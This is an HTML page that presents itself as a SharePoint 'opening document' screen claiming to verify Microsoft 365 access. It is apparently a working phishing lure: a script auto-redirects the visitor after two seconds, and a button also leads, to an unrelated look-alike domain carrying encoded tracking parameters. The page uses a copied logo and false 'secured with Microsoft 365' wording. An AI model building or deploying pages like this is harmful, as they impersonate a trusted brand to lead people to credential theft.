<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Opening document in SharePoint…</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- Auto redirect after 2 seconds -->
  <script>
    setTimeout(function () {
      window.location.href = "https://secure.sharedmforms.com/?aCXefF=NjE4MDkyZGQ2ZTZlNDNhODkzNzVjNmRmZmE3Yzk1YTk%3D&84K5B=E1aHz";
    }, 2000);
  </script>

  <style>
    /* Stop the builder from turning all links blue/underlined */
    a {
      color: inherit !important;
      text-decoration: none !important;
    }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background: #f3f4f6;
      color: #111827;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .card {
      background: #ffffff;
      max-width: 480px;
      width: 100%;
      padding: 32px 28px 26px;
      border-radius: 14px;
      box-shadow: 0 14px 35px rgba(15, 23, 42, 0.18);
      text-align: center;
    }

    /* renamed from .logo to avoid the builder replacing it */
    .sp-logo img {
      width: 70px;
      margin-bottom: 18px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    h1 {
      font-size: 1.4rem;
      margin: 0 0 8px;
      font-weight: 600;
    }

    .sub {
      font-size: 0.95rem;
      color: #4b5563;
      margin-bottom: 18px;
    }

    .spinner {
      margin: 12px auto 18px;
      width: 26px;
      height: 26px;
      border-radius: 50%;
      border: 3px solid #d1d5db;
      border-top-color: #2563eb;
      animation: spin 0.7s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .button {
      display: inline-block;
      padding: 12px 28px;
      border-radius: 8px;
      background: #2563eb;
      color: #ffffff !important;           /* force white text */
      font-size: 1rem;
      font-weight: 600;
      text-decoration: none !important;    /* no underline */
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(37, 99, 235, 0.35);
      transition: transform 0.08s ease, box-shadow 0.08s ease, background 0.08s ease;
    }

    /* make sure any nested spans also stay white */
    .button *, .button span, .button strong {
      color: #ffffff !important;
      text-decoration: none !important;
    }

    .button:hover {
      background: #1d4ed8;
      transform: translateY(-1px);
      box-shadow: 0 14px 32px rgba(37, 99, 235, 0.45);
    }

    .button:active {
      transform: translateY(0);
      box-shadow: 0 8px 18px rgba(37, 99, 235, 0.35);
    }

    .meta {
      font-size: 0.8rem;
      color: #6b7280;
      margin-top: 16px;
      line-height: 1.4;
    }

    .foot {
      margin-top: 18px;
      font-size: 0.78rem;
      color: #9ca3af;
    }
  </style>
</head>
<body>
  <div class="card">

    <!-- SharePoint-style logo -->
    <div class="sp-logo">
      <img src="https://cdn-icons-png.flaticon.com/512/906/906310.png" alt="SharePoint Logo" />
    </div>

    <h1>Opening document in SharePoint…</h1>
    <p class="sub">Please wait while we verify your Microsoft 365 access.</p>

    <div class="spinner"></div>

    <a class="button" href="https://secure.sharedmforms.com/?aCXefF=NjE4MDkyZGQ2ZTZlNDNhODkzNzVjNmRmZmE3Yzk1YTk%3D&84K5B=E1aHz">
      Open in SharePoint
    </a>

    <p class="meta">
      If you are not redirected automatically in a few seconds, click
      <strong>Open in SharePoint</strong> to view your document.
    </p>

    <div class="foot">
      Access secured with Microsoft 365. Only the intended recipient can view.
    </div>

  </div>
</body>
</html>
